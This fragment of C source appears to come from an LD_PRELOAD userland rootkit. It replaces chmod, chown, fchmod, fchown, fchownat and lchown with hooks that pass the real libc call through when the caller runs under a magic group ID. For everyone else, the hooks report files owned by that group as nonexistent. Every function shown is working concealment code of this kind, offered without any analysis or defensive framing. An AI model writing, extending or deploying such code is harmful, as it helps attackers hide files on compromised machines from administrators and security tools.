int chmod(const char *path, mode_t mode) {
  struct stat s_fstat;
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_chmod) old_chmod = dlsym(libc,"chmod");
  if(!old_xstat) old_xstat = dlsym(libc, "__xstat");
  if(getgid()==MAGIC_GID) return old_chmod(path,mode);
  memset(&s_fstat, 0, sizeof(stat));
  old_xstat(_STAT_VER, path, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) { errno = ENOENT; return -1; }
  return old_chmod(path,mode);
}

int chown(const char *path, uid_t owner, gid_t group) {
  struct stat s_fstat;
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_chown) old_chown = dlsym(libc,"chown");
  if(!old_xstat) old_xstat = dlsym(libc, "__xstat");
  if(getgid()==MAGIC_GID) return old_chown(path,owner,group);
  memset(&s_fstat, 0, sizeof(stat));
  old_xstat(_STAT_VER, path, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) { errno = ENOENT; return -1; }
  return old_chown(path,owner,group);
}

int fchmod(int fd, mode_t mode) {
  struct stat s_fstat;
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_fchmod) old_fchmod = dlsym(libc,"fchmod");
  if(!old_fxstat) old_fxstat = dlsym(libc, "__fxstat");
  if(getgid()==MAGIC_GID) return old_fchmod(fd,mode);
  memset(&s_fstat, 0, sizeof(stat));
  old_fxstat(_STAT_VER, fd, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) { errno = ENOENT; return -1; }
  return old_fchmod(fd,mode);
}

int fchown(int fd, uid_t owner, gid_t group) {
  struct stat s_fstat;
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_fchown) old_fchown = dlsym(libc,"fchown");
  if(!old_fxstat) old_fxstat = dlsym(libc, "__fxstat");
  if(getgid()==MAGIC_GID) return old_fchown(fd,owner,group);
  memset(&s_fstat, 0, sizeof(stat));
  old_fxstat(_STAT_VER, fd, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) { errno = ENOENT; return -1; }
  return old_fchown(fd,owner,group);
}

int fchownat(int dirfd, const char *pathname, uid_t owner, gid_t group, int flags) {
  struct stat s_fstat;
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_fchownat) old_fchownat = dlsym(libc,"fchownat");
  if(!old_xstat) old_xstat = dlsym(libc, "__xstat");
  if(getgid()==MAGIC_GID) return old_fchownat(dirfd,pathname,owner,group,flags);
  memset(&s_fstat, 0, sizeof(stat));
  old_xstat(_STAT_VER, pathname, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) { errno = ENOENT; return -1; }
  return old_fchownat(dirfd,pathname,owner,group,flags);
}


int lchown(const char *path, uid_t owner, gid_t group) {
  struct stat s_fstat;
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_lchown) old_lchown = dlsym(libc,"lchown");
  if(!old_xstat) old_xstat = dlsym(libc, "__xstat");
  if(getgid()==MAGIC_GID) return old_lchown(path,owner,group);
  memset(&s_fstat, 0, sizeof(stat));
  old_xstat(_STAT_VER, path, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) { errno = ENOENT; return -1; }
  return old_lchown(path,owner,group);
}
